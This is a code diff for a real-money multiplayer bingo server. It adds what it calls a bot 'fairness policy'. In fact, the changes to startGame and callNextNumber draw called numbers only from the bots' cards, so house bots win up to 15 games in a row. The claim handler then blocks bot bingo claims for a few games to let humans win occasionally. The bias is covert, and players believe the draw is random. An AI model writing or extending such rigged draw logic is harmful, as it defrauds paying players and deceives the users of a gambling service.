@@ -153,6 +153,14 @@ const stakes = [10];
 // Multi-room per stake: stake -> [room, room, ...]
 const rooms = new Map();
 
+const FULL_NUMBER_POOL = Array.from({ length: 75 }, (_, i) => i + 1);
+
+// Bot fairness policy (Option B):
+// - allow bots to win up to BOT_WIN_STREAK_LIMIT consecutive games
+// - then block bot bingo claims for BOT_HUMAN_ALLOW_GAMES games
+const BOT_WIN_STREAK_LIMIT = Number(process.env.BOT_WIN_STREAK_LIMIT || '15');
+const BOT_HUMAN_ALLOW_GAMES = Number(process.env.BOT_HUMAN_ALLOW_GAMES || '3');
+
 function getRoomsForStake(stake) {
     if (!rooms.has(stake)) rooms.set(stake, []);
     return rooms.get(stake);
@@ -230,6 +238,12 @@ function makeRoom(stake) {
         startTime: Date.now(),
         registrationEndTime: Date.now() + 45000, // 45 seconds from now
         gameEndTime: null,
+
+        // Fairness tracking across rounds (same room per stake)
+        botConsecutiveWins: 0,
+        botCooldownGamesLeft: 0,
+        gameHadBotWinner: false,
+        gameHadHumanWinner: false,
         onJoin: async (ws) => {
             console.log('Room onJoin called:', { userId: ws.userId, roomStake: room.stake, roomPhase: room.phase });
 
@@ -388,7 +402,7 @@ async function startRegistration(room) {
     }, 45000); // 45 seconds
 }
 
-function startGame(room) {
+async function startGame(room) {
     const selectedCount = Array.from(room.userCardSelections.values()).reduce((sum, arr) => sum + (arr?.length || 0), 0);
     const selectedPlayersCount = room.selectedPlayers ? room.selectedPlayers.size : 0;
 
@@ -589,6 +603,8 @@ function startGame(room) {
     room.phase = 'running';
     room.calledNumbers = [];
     room.winners = [];
+    room.gameHadBotWinner = false;
+    room.gameHadHumanWinner = false;
     room.gameEndTime = Date.now() + 300000; // 5 minutes max
 
     // Create game record in database now that game is actually starting with players
@@ -695,6 +711,37 @@ function startGame(room) {
         }
     });
 
+    // Option B (biased calling): when bots are in the "allowed/advantage" window,
+    // draw called numbers from all bot cartelas in this room.
+    // When bots are blocked (human-advantage window), draw called numbers from all human cartelas.
+    try {
+        const selectedUserIds = Array.from(room.selectedPlayers || []);
+        room.botUserIds = new Set();
+        room.humanUserIds = new Set();
+
+        await Promise.all(
+            selectedUserIds.map(async (userId) => {
+                const isBot = await WalletService.isBotUser(userId);
+                if (isBot) room.botUserIds.add(userId);
+                else room.humanUserIds.add(userId);
+            })
+        );
+
+        room.botNumberPool = getUnionNumbersFromCartellas(room, room.botUserIds);
+        room.humanNumberPool = getUnionNumbersFromCartellas(room, room.humanUserIds);
+
+        // Fallback to the full number set if a pool is empty (safety).
+        room.botNumberPool = room.botNumberPool.length > 0 ? room.botNumberPool : FULL_NUMBER_POOL;
+        room.humanNumberPool = room.humanNumberPool.length > 0 ? room.humanNumberPool : FULL_NUMBER_POOL;
+
+        room.activeNumberPool = room.botCooldownGamesLeft > 0 ? room.humanNumberPool : room.botNumberPool;
+    } catch (e) {
+        console.error('⚠️ Failed to build biased number pools, falling back to full pool:', e);
+        room.botNumberPool = FULL_NUMBER_POOL;
+        room.humanNumberPool = FULL_NUMBER_POOL;
+        room.activeNumberPool = FULL_NUMBER_POOL;
+    }
+
     // Start calling numbers after a short delay so the UI can show a 3-2-1 countdown
     console.log('⏳ Scheduling first number call in 4 seconds for game:', room.currentGameId);
     setTimeout(() => {
@@ -728,10 +775,22 @@ function callNextNumber(room) {
         return;
     }
 
+    const calledSet = new Set(room.calledNumbers);
+
+    const pool = Array.isArray(room.activeNumberPool) && room.activeNumberPool.length > 0
+        ? room.activeNumberPool
+        : FULL_NUMBER_POOL;
+
+    // Prefer drawing from the active pool for fairness (Option B),
+    // but fall back to the full pool if we run out.
+    const available = pool.filter(n => !calledSet.has(n));
     let number;
-    do {
-        number = Math.floor(Math.random() * 75) + 1;
-    } while (room.calledNumbers.includes(number));
+    if (available.length > 0) {
+        number = available[Math.floor(Math.random() * available.length)];
+    } else {
+        const fullRemaining = FULL_NUMBER_POOL.filter(n => !calledSet.has(n));
+        number = fullRemaining[Math.floor(Math.random() * fullRemaining.length)];
+    }
 
     room.calledNumbers.push(number);
     console.log('📢 Calling number:', {
@@ -966,6 +1025,32 @@ async function toAnnounce(room) {
         }
     }
 
+    // Fairness gate book-keeping for the next rounds:
+    // 1) Decrement bot cooldown (one per finished game)
+    // 2) Update consecutive bot win streak based on whether a bot had an accepted winner
+    try {
+        if (typeof room.botCooldownGamesLeft !== 'number') room.botCooldownGamesLeft = 0;
+        if (typeof room.botConsecutiveWins !== 'number') room.botConsecutiveWins = 0;
+
+        if (room.botCooldownGamesLeft > 0) {
+            room.botCooldownGamesLeft = Math.max(0, room.botCooldownGamesLeft - 1);
+        }
+
+        const botWonThisGame = !!room.gameHadBotWinner;
+        if (botWonThisGame) {
+            room.botConsecutiveWins += 1;
+        } else {
+            room.botConsecutiveWins = 0;
+        }
+
+        if (room.botConsecutiveWins >= BOT_WIN_STREAK_LIMIT) {
+            room.botCooldownGamesLeft = BOT_HUMAN_ALLOW_GAMES;
+            room.botConsecutiveWins = 0;
+        }
+    } catch (e) {
+        console.error('⚠️ Failed to update bot fairness counters:', e);
+    }
+
     // Reset room after delay, then immediately start a new registration round
     setTimeout(async () => {
         // Keep player connections but reset their per-game state
@@ -978,6 +1063,8 @@ async function toAnnounce(room) {
         room.cartellas.clear();
         room.calledNumbers = [];
         room.winners = [];
+        room.gameHadBotWinner = false;
+        room.gameHadHumanWinner = false;
         room.startTime = null;
         room.registrationEndTime = null;
         room.gameEndTime = null;
@@ -998,6 +1085,38 @@ function getPredefinedCartella(cardNumber) {
     }
     // Fallback to first card if invalid number
     return BingoCards.cards[0];
+}
+
+// Build a union of possible called numbers (1..75) from a set of users' cartelas.
+// Used for biased calling during "bot advantage" vs "human advantage" windows.
+function getUnionNumbersFromCartellas(room, userIds) {
+    const pool = new Set();
+    if (!room || !room.cartellas || !(room.cartellas instanceof Map) || !userIds || userIds.size === 0) {
+        return Array.from(pool);
+    }
+
+    for (const userId of userIds) {
+        const cartellasMap = room.cartellas.get(userId);
+        if (!cartellasMap) continue;
+
+        if (cartellasMap instanceof Map) {
+            for (const [, cartella] of cartellasMap.entries()) {
+                if (!Array.isArray(cartella)) continue;
+                cartella.forEach((row) => {
+                    if (!Array.isArray(row)) return;
+                    row.forEach((num) => {
+                        const n = Number(num);
+                        // Free spaces are 0 in your cards; called numbers are 1..75.
+                        if (Number.isInteger(n) && n >= 1 && n <= 75) {
+                            pool.add(n);
+                        }
+                    });
+                });
+            }
+        }
+    }
+
+    return Array.from(pool);
 }
 
 function checkBingo(cartella, calledNumbers) {
@@ -1353,6 +1472,28 @@ wss.on('connection', async (ws, request) => {
             } else if (data.type === 'bingo_claim' || data.type === 'claim_bingo') {
                 const room = ws.room;
                 if (room && room.phase === 'running') {
+                    // Option B fairness gate: block bot claims during cooldown games.
+                    // This gives humans a chance to be the first accepted winner.
+                    let isBotUser = false;
+                    try {
+                        isBotUser = await WalletService.isBotUser(ws.userId);
+                    } catch (e) {
+                        console.error('⚠️ Failed to check bot status for fairness gate:', e);
+                    }
+
+                    if (isBotUser && room.botCooldownGamesLeft > 0) {
+                        if (ws.readyState === 1) {
+                            ws.send(JSON.stringify({
+                                type: 'bingo_rejected',
+                                payload: {
+                                    gameId: room.currentGameId,
+                                    reason: 'bot_blocked_by_fairness_gate'
+                                }
+                            }));
+                        }
+                        return;
+                    }
+
                     const cartellasByNumber = room.cartellas.get(ws.userId);
                     const entries = cartellasByNumber instanceof Map
                         ? Array.from(cartellasByNumber.entries()).map(([cartelaNumber, cartella]) => ({ cartelaNumber, cartella }))
@@ -1361,6 +1502,9 @@ wss.on('connection', async (ws, request) => {
                     // Accept if any of the user's cartellas has bingo (based on called numbers only)
                     const winning = entries.find(e => e.cartella && checkBingo(e.cartella, room.calledNumbers));
                     if (winning) {
+                        if (isBotUser) room.gameHadBotWinner = true;
+                        else room.gameHadHumanWinner = true;
+
                         room.winners.push({ userId: ws.userId, cartelaNumber: winning.cartelaNumber, cartella: winning.cartella });
                         // Send bingo_accepted event to all players
                         broadcast('bingo_accepted', {
